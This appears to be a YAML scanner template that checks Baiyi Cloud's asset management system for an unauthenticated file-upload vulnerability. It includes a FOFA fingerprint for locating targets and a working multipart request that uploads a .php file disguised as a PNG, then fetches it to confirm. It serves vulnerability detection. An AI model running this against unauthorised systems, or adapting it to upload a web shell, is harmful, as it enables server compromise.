id: baiyi-mobilefront2-fileupload

info:
  name: 百易云资产管理运营系统mobilefront2前台文件上传漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |-
    湖南众合百易信息技术有限公司（简称：百易云）成立于2017年是一家专注于不动产领域数字化研发及服务的国家高新技术企业，公司拥有不动产领域的数字化全面解决方案、覆盖住宅、写字楼、商业中心、专业市场、产业园区、公建、后勤等多种业态、通过数字化帮助企业实现数字化转型，有效提高公司管理水平及业务办理效率、降低运营成本，公司自成立以来，已帮助众多企业实现数字化转型。资产管理运营系统mobilefront2前台文件上传漏洞
    faofa: body="media/css/uniform.default.css" && body="资管云"
  tags: baiyi,fileupload
  created: 2024/12/06

set:
  rboundary: randomLowercase(8)
  filename: randomLowercase(10)
  rbody: randomLowercase(32)
rules:
  r0:
    request:
      method: POST
      path: /mobilefront/c/2.php
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: "\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"file1\"; filename=\"{{filename}}.php\"\r\n\
        Content-Type: image/png\r\n\
        \r\n\
        {{rbody}}\r\n\
        ------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: response.status == 200 && response.body.bcontains(b'"src":') && response.body.bcontains(b'"size":') && response.body.bcontains(b'"error":')
    output:
      search: '"/c\\\\/images2\\\\/(?P<file>.+?).php\"".bsubmatch(response.body)'
      file: search["file"]
  r1:
    request:
      method: GET
      path: /mobilefront/c/images2/{{file}}.php
    expression: response.status == 200 && response.body.bcontains(bytes(rbody))
expression: r0() && r1()
